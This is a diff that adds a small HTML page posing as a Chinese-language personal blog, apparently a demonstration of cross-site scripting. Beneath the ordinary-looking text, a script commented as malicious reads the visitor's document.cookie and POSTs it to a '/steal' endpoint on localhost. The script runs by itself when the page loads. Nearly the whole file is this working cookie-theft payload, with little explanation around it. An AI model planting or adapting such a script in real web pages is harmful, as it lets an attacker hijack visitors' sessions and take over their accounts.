@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>我的博客</title>
+</head>
+<body>
+    <h1>我的博客文章</h1>
+    <p>这是一篇看似正常的博客内容...</p>
+
+    <!-- 恶意脚本 -->
+    <script>
+        function stealCookie() {
+            const stolenCookie = document.cookie;
+            
+            fetch('http://localhost:3000/steal', {
+                method: 'POST',
+                body: JSON.stringify({ cookie: stolenCookie }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+        }
+
+        // 模拟自动执行
+        stealCookie();
+    </script>
+</body>
+</html>
